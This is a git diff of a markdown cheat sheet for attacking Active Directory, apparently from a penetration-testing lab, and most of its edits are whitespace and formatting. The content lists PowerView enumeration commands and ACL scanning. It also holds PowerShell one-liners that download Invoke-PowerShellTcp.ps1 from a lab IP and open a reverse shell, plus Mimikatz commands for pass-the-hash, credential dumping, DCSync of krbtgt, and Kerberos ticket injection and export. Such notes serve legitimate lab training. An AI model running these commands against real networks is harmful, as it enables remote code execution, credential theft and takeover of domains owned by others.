@@ -12,8 +12,11 @@ To input the output of the first command into second command use this powershell
 
 
 `<First command> | %{<Second command> -<argument> $_}`
+
 %{} is an alias for ForEach-Object{}
+
 ?{} is an alias for Where-Object{}
+
 $_ is variable
 
 
@@ -28,17 +31,21 @@ To filter out an object type we can use this technique with pipe.
 
 Find-LocalAdminAccess
 
+
 **To get Domain sid:-**
 
 Get-DomainSID 
 
 Arguments -Domain “domain name”
 
+
 **To get DC:-**
 
 Get-NetDomainController
 
 Arguments -Domain “domain name”
+
+
 
 **To get users in current domain:-**
 
@@ -61,11 +68,13 @@ Arguments -Properties pwdlastset
 
 Find-UserField -SearchField Description -SearchTerm ”built”
 
+
 **To Get all computers:-**
 
 Get-NetComputer -FullData
 
 Many arguments -OperatingSystem -Ping -FullData
+
 
 **To get groups:-**
 
@@ -73,25 +82,28 @@ Get-NetGroup
 
 Arguments -FullData -Domain
 
+
 **To get members of a particular group:-**
 
 Get-NetGroupMember -GroupName "Domain Admins"
 
+
 **To Group Policies**
 
 Get-NetGPO
-
-# Shows active Policy on specified machine
 Get-NetGPO -ComputerName <Name of the PC>
 Get-NetGPOGroup
 
 **To Get users that are part of a Machine's local Admin group**
 Find-GPOComputerAdmin -ComputerName <ComputerName>
 
+
+
 **To get OUs:**
 
 Get-NetOU -FullData 
 Get-NetGPO -GPOname <The GUID of the GPO>
+
 
 
 **Mapping forest:-**
@@ -123,6 +135,7 @@ Get-DomainUser -TrustedToAuth (Poweview Dev.)
 Get-NetComputer -UnConstrained
 
 
+
 **To get ACLs**
 
 Get-ObjectAcl -SamAccountName <AccountName> -ResolveGUIDs
@@ -133,11 +146,15 @@ Get-ObjectAcl -ADSprefix 'CN=Administrator, CN=Users' -Verbose
 Invoke-ACLScanner -ResolveGUIDs
 
 
+
+
 ##Command Execution techniques for reverse shells.
 
 `powershell.exe -c iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.113/Invoke-PowerShellTcp.ps1'));Invoke-PowerShellTcp -Reverse -IPAddress 172.16.100.X -Port 443`
 
 `powershell.exe iex (iwr http://172.16.100.113/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Invoke-PowerShellTcp -Reverse -IPAddress 172.16.100.113 -Port 443`
+
+
 
 ##Mimikatz
 
@@ -149,24 +166,24 @@ Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.money
 
 **Dump creds:-**
 
-Invoke-Mimikatz
+`Invoke-Mimikatz
 
 Invoke-Mimikatz -Command ‘“lsadump::lsa /patch”’
 
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
 
-(dcsync requires 3 permission )
+(dcsync requires 3 permission )`
 
 
 #Tickets
 
 **Inject ticket:-**
 
-Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\krbtgt_tkt.kirbi"'
+`Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\krbtgt_tkt.kirbi"'`
 
 **Export Tickets:-**
 
-Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
+`Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'`
 
 **Golden tkt**
 
